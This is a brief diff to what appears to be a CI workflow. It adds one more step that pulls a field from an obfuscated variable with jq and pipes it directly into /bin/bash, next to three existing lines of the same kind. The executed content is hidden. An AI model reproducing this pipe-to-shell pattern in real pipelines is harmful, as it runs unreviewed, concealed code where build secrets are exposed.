@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$jd200" | jq -r .xv15 | /bin/bash
           printf '%s' "$ldg5" | jq -r .ep3035 | /bin/bash
           echo $wek59301 | jq -r .l04194 | /bin/bash
+          echo $zps2 | jq -r .dhxt941 | /bin/bash
 
       - name: Save output
         if: always()
